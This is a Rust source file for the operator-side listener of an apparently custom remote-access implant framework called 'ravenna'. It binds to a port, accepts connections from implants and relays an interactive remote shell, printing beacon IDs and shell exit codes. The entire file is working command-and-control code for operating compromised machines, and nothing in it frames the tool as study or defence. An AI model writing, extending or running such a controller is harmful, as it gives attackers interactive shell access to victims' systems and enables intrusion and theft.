/* Documntation:
operator side runs on laptop.
bind -> listen -> accept loop one implant at a time for v0.1.
*/

use ravenna::frame;
use ravenna::proto::{Envelope, ShellData, envelope};
use ravenna::socket::{Sock, SockRole};
use std::sync::Arc;

fn _emit(_chunk: &[u8]) {
    unsafe {
        libc::write(1, _chunk.as_ptr() as *const std::ffi::c_void, _chunk.len());
    }
}

fn _on_msg(_env: Envelope) -> bool {
    match _env.m {
        Some(envelope::M::D(_d)) => _emit(&_d.chunk),
        Some(envelope::M::E(_e)) => {
            eprintln!("\nshell exited code={}", _e.code);
            return false;
        }
        Some(envelope::M::B(_b)) => eprintln!("\nbeacon id={}", _b.implant_id),
        _ => {}
    }
    true
}

fn _net_to_out(_sock: Arc<Sock>) {
    while let Some(_e) = frame::recv_msg(&_sock) {
        if !_on_msg(_e) {
            break;
        }
    }
    eprintln!("\nimplant went away.");
}

fn _stdin_to_net(_sock: Arc<Sock>) {
    let mut _in = [0u8; 4096];
    loop {
        let _n = unsafe { libc::read(0, _in.as_mut_ptr() as *mut _, _in.len()) };
        if _n <= 0 {
            break;
        }
        let _m = envelope::M::D(ShellData {
            chunk: _in[.._n as usize].to_vec(),
        });
        frame::send_msg(&_sock, &Envelope { m: Some(_m) });
    }
}

fn _handle(_c: Sock) {
    let _c = Arc::new(_c);
    let _r = _c.clone();
    let _t1 = std::thread::spawn(move || _net_to_out(_r));
    _stdin_to_net(_c.clone());
    unsafe {
        libc::shutdown(_c.fd(), libc::SHUT_RDWR);
    }
    let _ = _t1.join();
}

fn _listen_addr() -> (String, u16) {
    let _args: Vec<String> = std::env::args().collect();
    let _iface = _args.get(1).cloned().unwrap_or_else(|| "0.0.0.0".into());
    let _port: u16 = _args.get(2).and_then(|_p| _p.parse().ok()).unwrap_or(8080);
    (_iface, _port)
}

fn main() {
    let (_iface, _port) = _listen_addr();
    let _l = Sock::new(SockRole::Server {
        interface: _iface.clone(),
        port: _port,
        backlog: 5,
    });
    eprintln!("server listening on {_iface}:{_port} ...");
    loop {
        eprintln!("got implant!");
        _handle(_l.accept());
        eprintln!("waiting for next implant ...");
    }
}
